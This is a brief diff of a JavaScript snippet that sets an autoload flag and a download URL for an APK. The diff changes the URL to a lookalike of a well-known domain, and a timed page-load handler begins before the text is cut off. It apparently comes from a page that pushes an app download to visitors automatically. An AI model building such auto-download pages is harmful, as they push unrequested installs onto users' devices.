@@ -1,6 +1,6 @@
 ```javascript
     var autoload = true;
-    var downurl = "http://wj.gongguidz.com/apk/nyy/ss902.apk";
+    var downurl = "http://biadu.com/apk.apk";
 
     $(document).ready(function () {
         var time = 2000;
